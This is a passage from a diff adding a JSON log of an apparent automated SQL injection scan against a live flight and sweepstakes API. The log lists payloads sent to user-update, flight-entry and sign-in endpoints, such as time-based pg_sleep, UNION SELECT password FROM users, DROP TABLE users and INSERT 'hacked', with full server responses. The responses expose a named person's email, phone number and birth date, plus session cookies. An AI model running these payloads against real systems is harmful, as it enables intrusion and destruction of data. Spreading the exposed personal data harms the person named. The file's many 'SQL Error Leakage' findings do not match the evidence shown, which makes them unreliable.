+        "set-cookie": "sails.sid=s%3AwaFqJKXNpqZIwsebOJYLnA4VyoCXJjke.5b%2Bs9v2KGyfik1OzVH0zJjZtxlFNoEmKj1ZY9gGE7LQ; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "PATCH",
+      "test_type": "time_based_user_update",
+      "params": null,
+      "json_data": {
+        "firstName": "Sameer'; SELECT pg_sleep(5)--"
+      },
+      "status_code": 200,
+      "response_length": 2087,
+      "elapsed_time": 0.4088566303253174,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364909738,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"Sameer'; SELECT pg_sleep(5)--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersio",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:30 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"827-H83WTWvLLiIzAmcGjHDL7DTt4S4\"",
+        "set-cookie": "sails.sid=s%3AgKH4SXJSt-7XJHMCpWIRrNElwwppQCNA.c%2FePJO4SX%2F5rXDmDm6eR8pGH4x2eA4%2BtkPlC63bZVVk; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "PATCH",
+      "test_type": "time_based_user_update",
+      "params": null,
+      "json_data": {
+        "firstName": "Sameer' AND (SELECT 1 FROM pg_sleep(5))--"
+      },
+      "status_code": 200,
+      "response_length": 2099,
+      "elapsed_time": 0.3337836265563965,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364910161,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"Sameer' AND (SELECT 1 FROM pg_sleep(5))--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:30 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"833-1s3ePyK9cfIpgy4/XsBOttFj1qU\"",
+        "set-cookie": "sails.sid=s%3AFSC2IChRTy_2taIwT3OCv86ivAJvdLy1.w9wGxGb76%2FiuixDDIDI8l7XNM%2BXbmxNg3TDFyW4TRuo; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v2/flight/8800%3B%20DROP%20TABLE--/enter",
+      "method": "POST",
+      "test_type": "v2_flight_enter",
+      "params": null,
+      "json_data": null,
+      "status_code": 400,
+      "response_length": 254,
+      "elapsed_time": 0.13271641731262207,
+      "response_snippet": "{\"code\":\"E_MISSING_OR_INVALID_PARAMS\",\"problems\":[\"Invalid \\\"id\\\":\\n  \u00b7 Expecting a number, but got a string.\"],\"message\":\"The server could not fulfill this request (`POST /v2/flight/8800;%20DROP%20TABLE--/enter`) due to 1 missing or invalid parameter.\"}",
+      "headers": {
+        "content-length": "255",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:14 GMT",
+        "access-control-allow-origin": "*",
+        "etag": "W/\"ff-GS8eSSDfRagF5MBhbG+cpkhID90\"",
+        "set-cookie": "sails.sid=s%3AkUpWKAfnXYc_basJ7tGKr8f1SVIm2ViV.oqfGkXRQcCAX3LQGd%2BvteYtl%2FURI6a%2FSjR01ekDdQgo; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "error"
+      }
+    },
+    {
+      "endpoint": "/v2/flight/8800%27%20UNION%20SELECT--/enter",
+      "method": "POST",
+      "test_type": "v2_flight_enter",
+      "params": null,
+      "json_data": null,
+      "status_code": 400,
+      "response_length": 256,
+      "elapsed_time": 0.1273508071899414,
+      "response_snippet": "{\"code\":\"E_MISSING_OR_INVALID_PARAMS\",\"problems\":[\"Invalid \\\"id\\\":\\n  \u00b7 Expecting a number, but got a string.\"],\"message\":\"The server could not fulfill this request (`POST /v2/flight/8800'%20UNION%20SELECT--/enter`) due to 1 missing or invalid parameter.\"}",
+      "headers": {
+        "content-length": "257",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:14 GMT",
+        "access-control-allow-origin": "*",
+        "etag": "W/\"101-iz9JXGJoRJ5caXipl3Mz9xIbKPA\"",
+        "set-cookie": "sails.sid=s%3ACxUAQjnSY_7YxqF0LnqMgIVIGUTPq2rz.Ct2FfNLYSPQJx4bPXVqPp0ysSSFiDEnpwF7EfUAvYk0; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "error"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "PATCH",
+      "test_type": "second_order_store",
+      "params": null,
+      "json_data": {
+        "firstName": "' OR 1=1--"
+      },
+      "status_code": 200,
+      "response_length": 2068,
+      "elapsed_time": 0.3040931224822998,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364966865,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' OR 1=1--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersion\":null,\"isEulaAcce",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:27 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"814-gxtThq+ueq46aC2GrIZK+nepBxM\"",
+        "set-cookie": "sails.sid=s%3Ab_6t7Jbc2qUcovKmviVToxywMXDFhl5Y.pDvqIOLlQzkvsLJawNMk9lKRVSwWRqmDhKNy5FY5pco; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "GET",
+      "test_type": "second_order_trigger",
+      "params": null,
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 3179,
+      "elapsed_time": 0.18456077575683594,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364966865,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' OR 1=1--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersion\":null,\"isEulaAcce",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:28 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"c6b-lQ4YYtmG6nKNBVrJcEog4OnKGWE\"",
+        "set-cookie": "sails.sid=s%3At8735sw-wnyYU6QrdJQMFzCHw2n3qC5-.4p%2BnFoGe6ZBa6oXu81ryl2ZGVF7r3mF212MPuPtFUIY; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "PATCH",
+      "test_type": "second_order_store",
+      "params": null,
+      "json_data": {
+        "firstName": "'; DROP TABLE users--"
+      },
+      "status_code": 200,
+      "response_length": 2079,
+      "elapsed_time": 0.309096097946167,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364968544,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"'; DROP TABLE users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersion\":null,",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:28 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"81f-jW83UG+mE+jDnwY6mSoBEA/J+8U\"",
+        "set-cookie": "sails.sid=s%3AHsRCT4Obj2JZIuOP0E5f44ejBL-ZGczH.XLPrMjA3gOrE1zlNyO0TzjgmV8Kg65%2Fl8FTvL30SYNQ; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "GET",
+      "test_type": "second_order_trigger",
+      "params": null,
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 3190,
+      "elapsed_time": 0.1777184009552002,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364968544,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"'; DROP TABLE users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eulaVersion\":null,",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:29 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"c76-6tsjxe2a3wEe/fW/HqAfLZ5su1M\"",
+        "set-cookie": "sails.sid=s%3AMvcVVx_EESYBJ5S1h5CMP5T-VoO48JYR.ErVOFVO3DyKwk16oHOHrchWSRaB%2F4CxqwAIaeR1QE%2FA; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "PATCH",
+      "test_type": "second_order_store",
+      "params": null,
+      "json_data": {
+        "firstName": "' UNION SELECT password FROM users--"
+      },
+      "status_code": 200,
+      "response_length": 2094,
+      "elapsed_time": 0.37288832664489746,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364970233,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT password FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eul",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:30 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"82e-b9nRZOScdYIS3AInPumO7zVvZxQ\"",
+        "set-cookie": "sails.sid=s%3ALRSRUxLZFHYHoB8dMvOfgZ2JX-Ejd86h.hdsYoZ%2BqwGjV8JnSW81yH%2FSLE2%2FKSHOYc72zpf9V7U4; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    },
+    {
+      "endpoint": "/v1/user",
+      "method": "GET",
+      "test_type": "second_order_trigger",
+      "params": null,
+      "json_data": null,
+      "status_code": 200,
+      "response_length": 3205,
+      "elapsed_time": 0.18230938911437988,
+      "response_snippet": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364970233,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priorityScore\":1931577847,\"firstName\":\"' UNION SELECT password FROM users--\",\"middleName\":\"\",\"lastName\":\"'; INSERT INTO users VALUES('hacked')--\",\"dateOfBirth\":\"1991-08-14\",\"weight\":140,\"gender\":\"Male\",\"isCarbonOffsetEnrolled\":true,\"successfulReferralCount\":0,\"lastFlightPurchase\":null,\"eul",
+      "headers": {
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:49:31 GMT",
+        "access-control-allow-origin": "*",
+        "content-encoding": "gzip",
+        "etag": "W/\"c85-jEsKP0TgcmO7o9YpkrjM0UwFJhk\"",
+        "set-cookie": "sails.sid=s%3AMW-QYAntZjFnk5yvGqQk2JuAxDpnoMX0.J%2B2bA%2BwbOUJrxr2ETCP1D%2B23ODk88aWt1aXWUyWWWaY; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "success",
+        "transfer-encoding": "chunked"
+      }
+    }
+  ],
+  "boolean_blind_candidates": [],
+  "database_detected": "postgresql",
+  "findings": [
+    {
+      "severity": "HIGH",
+      "type": "SQL Error Leakage",
+      "endpoint": "/v1/user",
+      "evidence": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364903351,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"attacker@example.com\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priori"
+    },
+    {
+      "severity": "HIGH",
+      "type": "SQL Error Leakage",
+      "endpoint": "/v1/user",
+      "evidence": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364903701,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"attacker@example.com\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priori"
+    },
+    {
+      "severity": "HIGH",
+      "type": "SQL Error Leakage",
+      "endpoint": "/v1/user",
+      "evidence": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364904066,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"attacker@example.com\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priori"
+    },
+    {
+      "severity": "HIGH",
+      "type": "SQL Error Leakage",
+      "endpoint": "/v1/user",
+      "evidence": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364904472,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"attacker@example.com\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priori"
+    },
+    {
+      "severity": "HIGH",
+      "type": "SQL Error Leakage",
+      "endpoint": "/v1/user",
+      "evidence": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364904811,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"attacker@example.com\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"priori"
+    },
+    {
+      "severity": "HIGH",
+      "type": "SQL Error Leakage",
+      "endpoint": "/v1/user",
+      "evidence": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364905450,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"test@test.com' OR '1'='1\",\"confirmedEmail\":\"sameer.s.chopra@gmail.com\",\"pr"
+    },
+    {
+      "severity": "HIGH",
+      "type": "SQL Error Leakage",
+      "endpoint": "/v1/user",
+      "evidence": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906097,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gm"
+    },
+    {
+      "severity": "HIGH",
+      "type": "SQL Error Leakage",
+      "endpoint": "/v1/user",
+      "evidence": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gm"
+    },
+    {
+      "severity": "HIGH",
+      "type": "SQL Error Leakage",
+      "endpoint": "/v1/user",
+      "evidence": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gm"
+    },
+    {
+      "severity": "HIGH",
+      "type": "SQL Error Leakage",
+      "endpoint": "/v1/user",
+      "evidence": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gm"
+    },
+    {
+      "severity": "HIGH",
+      "type": "SQL Error Leakage",
+      "endpoint": "/v1/user",
+      "evidence": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gm"
+    },
+    {
+      "severity": "HIGH",
+      "type": "SQL Error Leakage",
+      "endpoint": "/v1/user",
+      "evidence": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gm"
+    },
+    {
+      "severity": "HIGH",
+      "type": "SQL Error Leakage",
+      "endpoint": "/v1/user",
+      "evidence": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gm"
+    },
+    {
+      "severity": "HIGH",
+      "type": "SQL Error Leakage",
+      "endpoint": "/v1/user",
+      "evidence": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gm"
+    },
+    {
+      "severity": "HIGH",
+      "type": "SQL Error Leakage",
+      "endpoint": "/v1/user",
+      "evidence": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gm"
+    },
+    {
+      "severity": "HIGH",
+      "type": "SQL Error Leakage",
+      "endpoint": "/v1/user",
+      "evidence": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gm"
+    },
+    {
+      "severity": "HIGH",
+      "type": "SQL Error Leakage",
+      "endpoint": "/v1/user",
+      "evidence": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gm"
+    },
+    {
+      "severity": "HIGH",
+      "type": "SQL Error Leakage",
+      "endpoint": "/v1/user",
+      "evidence": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gm"
+    },
+    {
+      "severity": "HIGH",
+      "type": "SQL Error Leakage",
+      "endpoint": "/v1/user",
+      "evidence": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gm"
+    },
+    {
+      "severity": "HIGH",
+      "type": "SQL Error Leakage",
+      "endpoint": "/v1/user",
+      "evidence": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364906817,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gm"
+    },
+    {
+      "severity": "HIGH",
+      "type": "SQL Error Leakage",
+      "endpoint": "/v1/user",
+      "evidence": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364909738,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gm"
+    },
+    {
+      "severity": "HIGH",
+      "type": "SQL Error Leakage",
+      "endpoint": "/v1/user",
+      "evidence": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364910161,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gm"
+    },
+    {
+      "severity": "HIGH",
+      "type": "SQL Error Leakage",
+      "endpoint": "/v2/flight/8800%3B%20DROP%20TABLE--/enter",
+      "evidence": "{\"code\":\"E_MISSING_OR_INVALID_PARAMS\",\"problems\":[\"Invalid \\\"id\\\":\\n  \u00b7 Expecting a number, but got a string.\"],\"message\":\"The server could not fulfill this request (`POST /v2/flight/8800;%20DROP%20TA"
+    },
+    {
+      "severity": "HIGH",
+      "type": "SQL Error Leakage",
+      "endpoint": "/v2/flight/8800%27%20UNION%20SELECT--/enter",
+      "evidence": "{\"code\":\"E_MISSING_OR_INVALID_PARAMS\",\"problems\":[\"Invalid \\\"id\\\":\\n  \u00b7 Expecting a number, but got a string.\"],\"message\":\"The server could not fulfill this request (`POST /v2/flight/8800'%20UNION%20S"
+    },
+    {
+      "severity": "HIGH",
+      "type": "SQL Error Leakage",
+      "endpoint": "/v1/user",
+      "evidence": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364966865,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gm"
+    },
+    {
+      "severity": "HIGH",
+      "type": "SQL Error Leakage",
+      "endpoint": "/v1/user",
+      "evidence": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364966865,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gm"
+    },
+    {
+      "severity": "HIGH",
+      "type": "SQL Error Leakage",
+      "endpoint": "/v1/user",
+      "evidence": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364968544,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gm"
+    },
+    {
+      "severity": "HIGH",
+      "type": "SQL Error Leakage",
+      "endpoint": "/v1/user",
+      "evidence": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364968544,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gm"
+    },
+    {
+      "severity": "HIGH",
+      "type": "SQL Error Leakage",
+      "endpoint": "/v1/user",
+      "evidence": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364970233,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gm"
+    },
+    {
+      "severity": "HIGH",
+      "type": "SQL Error Leakage",
+      "endpoint": "/v1/user",
+      "evidence": "{\"sweepstakesEntries\":[],\"createdAt\":1710825847458,\"updatedAt\":1762364970233,\"id\":20254,\"phoneNumber\":\"+13035234453\",\"email\":\"' UNION SELECT password FROM users--\",\"confirmedEmail\":\"sameer.s.chopra@gm"
+    }
+  ],
+  "all_tests": [
+    {
+      "endpoint": "/v1/auth/initiateSignIn",
+      "method": "POST",
+      "test_type": "classic_sql",
+      "params": null,
+      "json_data": {
+        "phoneNumber": "' OR '1'='1"
+      },
+      "status_code": 400,
+      "response_length": 95,
+      "elapsed_time": 0.25583624839782715,
+      "response_snippet": "{\"message\":\"Phone number is not a valid US phone number.\",\"type\":\"invalid_phone_number_format\"}",
+      "headers": {
+        "content-length": "95",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:20 GMT",
+        "access-control-allow-origin": "*",
+        "etag": "W/\"5f-1kafxksEbjlkNP/y6FcX7kIrRwc\"",
+        "set-cookie": "sails.sid=s%3AisSTso7dAsv0KSOmPt56P7EyQS4BDJUB.JOWyMWUOk58H8Ln%2FwemZ35MTpqVUWFc4jpN7NP3R3oU; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "invalidPhoneNumber"
+      }
+    },
+    {
+      "endpoint": "/v1/auth/initiateSignIn",
+      "method": "POST",
+      "test_type": "classic_sql",
+      "params": null,
+      "json_data": {
+        "phoneNumber": "' OR 1=1--"
+      },
+      "status_code": 400,
+      "response_length": 95,
+      "elapsed_time": 0.3009309768676758,
+      "response_snippet": "{\"message\":\"Phone number is not a valid US phone number.\",\"type\":\"invalid_phone_number_format\"}",
+      "headers": {
+        "content-length": "95",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:20 GMT",
+        "access-control-allow-origin": "*",
+        "etag": "W/\"5f-1kafxksEbjlkNP/y6FcX7kIrRwc\"",
+        "set-cookie": "sails.sid=s%3ADK18P8mpSbnFpHodYSuOr07yr8hl7t5y.ywGXj7bXLzRHdmbWlVm3L3%2FHWlJHsuCFlzumJIuuaWc; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "invalidPhoneNumber"
+      }
+    },
+    {
+      "endpoint": "/v1/auth/initiateSignIn",
+      "method": "POST",
+      "test_type": "classic_sql",
+      "params": null,
+      "json_data": {
+        "phoneNumber": "' OR 'x'='x"
+      },
+      "status_code": 400,
+      "response_length": 95,
+      "elapsed_time": 0.12598204612731934,
+      "response_snippet": "{\"message\":\"Phone number is not a valid US phone number.\",\"type\":\"invalid_phone_number_format\"}",
+      "headers": {
+        "content-length": "95",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:20 GMT",
+        "access-control-allow-origin": "*",
+        "etag": "W/\"5f-1kafxksEbjlkNP/y6FcX7kIrRwc\"",
+        "set-cookie": "sails.sid=s%3ASrbz_iorQ25LHFOaXqplpFyvNWyJBvBl.uYmPVoOStNGL%2B9MtXlVfYoVQvcCwvYig6KhnjmEZpMQ; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "invalidPhoneNumber"
+      }
+    },
+    {
+      "endpoint": "/v1/auth/initiateSignIn",
+      "method": "POST",
+      "test_type": "classic_sql",
+      "params": null,
+      "json_data": {
+        "phoneNumber": "') OR ('1'='1"
+      },
+      "status_code": 400,
+      "response_length": 95,
+      "elapsed_time": 0.30042028427124023,
+      "response_snippet": "{\"message\":\"Phone number is not a valid US phone number.\",\"type\":\"invalid_phone_number_format\"}",
+      "headers": {
+        "content-length": "95",
+        "content-type": "application/json; charset=utf-8",
+        "date": "Wed, 05 Nov 2025 17:48:20 GMT",
+        "access-control-allow-origin": "*",
+        "etag": "W/\"5f-1kafxksEbjlkNP/y6FcX7kIrRwc\"",
+        "set-cookie": "sails.sid=s%3AWLIKBfrgHojSso5ZOVOec1APTX6cv6Rj.Ox8C6CUlDNVwxtmqTBPSET7VRmvw3on1UJkqFscdWi8; Path=/; HttpOnly",
+        "vary": "Accept-Encoding",
+        "x-exit": "invalidPhoneNumber"
+      }
+    },
+    {
+      "endpoint": "/v1/auth/initiateSignIn",
+      "method": "POST",
+      "test_type": "classic_sql",
+      "params": null,
+      "json_data": {
+        "phoneNumber": "' OR '1'='1' --"
+      },
+      "status_code": 400,
+      "response_length": 95,
+      "elapsed_time": 0.12246203422546387,
